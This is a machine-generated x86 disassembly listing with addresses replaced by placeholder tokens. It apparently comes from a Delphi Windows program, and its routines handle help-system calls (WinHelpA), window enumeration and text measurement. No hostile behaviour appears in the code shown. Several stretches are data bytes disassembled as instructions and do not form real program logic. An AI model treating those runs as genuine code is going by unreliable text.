mov esi edx
mov ebx eax
mov eax ebx
call sub_439f40
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x194
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
sub_439f88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_442db8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_440060
mov edx 0x11
mov eax esi
call sub_440084
mov [ esi + 0x209 ] 0x1
mov [ esi + 0x210 ] 0x1
mov eax esi
call sub_43a158
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_439ff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_443f18
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_443e44
mov eax ebx
mov si 0xffc8
call sub_403418
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x208 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x100
or eax edx
xor edx edx
mov dl [ ebx + 0x20a ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
and [ edi + 0x24 ] 0xfffffffe
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x80
sub_43a077
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a105
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a10c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x210 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4408a4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_457668
test al al
je r-xdata
mov ebx [ ebx + 0x20c ]
mov eax ebx
mov si 0xffb8
call sub_403418
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43a158
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43a230
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebx + 0x1c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a237
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
cmp [ ebx + 0x209 ] 0x0
je r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_422ecc
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0xc ]
call sub_40422c
push eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x10 ]
call sub_40442c
push eax
push esi
call GetTextExtentPoint32A
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
push 0x5
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x8 ]
push eax
push 0x6
call GetSystemMetrics
shl eax 0x2
add eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43a240
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43fd74
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
xor eax eax
mov [ edi + 0x20c ] eax
sub_43a2d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
call sub_432154
mov esi eax
mov eax esi
call sub_432234
test al al
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43a37c
test al al
je r-xdata
push 0x1
mov eax [ edi + 0x4 ]
push eax
call SetBkMode
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4470c4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax esi
call sub_432334
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a33c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43a37c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a388
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a3ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a3b4
retn
sub_43a3c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
inc eax
add [ eax ] al
add dh dh
inc eax
push eax
inc eax
setne al
xor al 0x1
retn
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5c ] ah
inc ebx
add [ eax - 0x64000000 ] ah
mov [ eax + eax - 0x54 ] 0x2
inc edx
add [ eax + 0x34 ] dh
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah al
iretd
sub_43a40a
inc esp
add [ eax + edx * 8 ] dl
inc esp
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add [ edi + edi * 8 + 0x4e80041 ] cl
inc edx
add ah ah
enter 0x44 0xe0
aam 0x44
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_43a4b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44cf70
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43a4f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a515
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a51c
retn
sub_43a528
push 0xf9004776
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43ae8b
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43b018
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ae92
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f90
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408240
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_43af70
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408240
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403fc0
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43a6d4
mov eax [ ebp - 0x14 ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_43a5c0
mov eax [ 0xffffffffab0043a5 ]
movsd [ edi ] [ esi ]
inc ebx
add [ ebp + 0x590043a5 ] dh
movsd [ edi ] [ esi ]
inc ebx
add [ ecx - 0x5b ] ah
inc ebx
add [ ecx - 0x5b ] ch
inc ebx
add [ ecx - 0x5b ] dh
inc ebx
add [ ecx - 0x5b ] bh
inc ebx
add [ ecx - 0x76ffbc5b ] al
movsd [ edi ] [ esi ]
inc ebx
add [ ecx - 0x66ffbc5b ] dl
movsd [ edi ] [ esi ]
inc ebx
add [ ecx ] bh
stosd [ edi ]
cmp al al
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ ecx - 0x5b ] al
inc ebx
add [ ecx - 0x5b ] cl
inc ebx
add [ ecx - 0x5b ] dl
and [ ebp - 0x5a76ffbd ] 0xa5910043
inc ebx
add [ ecx + 0x390043a5 ] bl
cmp al al
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add [ ecx ] dh
movsd [ edi ] [ esi ]
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
push ecx
movsd [ edi ] [ esi ]
cmp al al
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40043a6 ] ch
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + 0x43a6 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + eax ] ah
add [ eax ] al
sub al 0x12
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
dec eax
mov cl 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc al 0x0
add [ eax ] al
mov al 0xb1
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a789
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f6c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404004
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a790
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43a6d4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a789
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f6c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404004
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a790
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43a7a4
push ebx
mov ebx eax
mov eax ebx
call sub_43aad4
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_40599c
sub_43a7e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a847
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43a6d4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a84e
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_43a858
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43a8e0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43a7cc
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042ec
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a8e7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_43a8f3
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a97b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43b018
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a982
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43a6d4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a900
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43a97b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43b018
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a982
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_43a6d4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a988
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43aa80
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_43a6d4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f58
mov eax ebx
call sub_43b018
test al al
je r-xdata
mov ecx sub_43a528
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aa87
lea eax [ ebp - 0x1c ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_43a6d4
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43af70
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403fc0
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43aaf0
push ebx
mov ebx eax
mov eax ebx
call sub_43aad4
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_40599c
pop ebx
retn
mov eax rw-data
call sub_40599c
sub_43ab20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43ab78
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ab7f
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43a6d4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43ab88
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ac7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408f18
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_43a6d4
mov eax ebx
call sub_43b018
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ac85
lea eax [ ebp - 0x110 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041dc
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_43af70
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041dc
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43ac9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43acfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad05
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43a6d4
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43ad10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ad90
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_43a6d4
mov eax ebx
call sub_43b018
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ad97
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43af70
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43aea0
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408990
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_43aefb
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_40896c
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_43af70
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push sub_43afe6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_43af54
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43afed
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407f68
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_43affc
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_43b018
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_43af54
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_43aff8
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_43affc
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_43b074
sub_43b074
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43b0f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43aad4
call GetTickCount
mov ebx eax
push 0x0
call sub_4064d8
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_43a6d4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b0f8
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43b100
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_403540
call sub_4059b4
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43b148
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_43b174
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43b1e2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b1e9
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_40599c
mov eax rw-data
call sub_40599c
mov eax rw-data
call sub_40599c
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_40599c
mov eax [ rw-data ]
call sub_43a7a4
sub_43b1ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43b23e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b245
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b100
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_40599c
mov edx eax
mov eax [ rw-data ]
call sub_42b450
sub_43b248
dec esp
mov dl 0x43
add [ ecx ] al
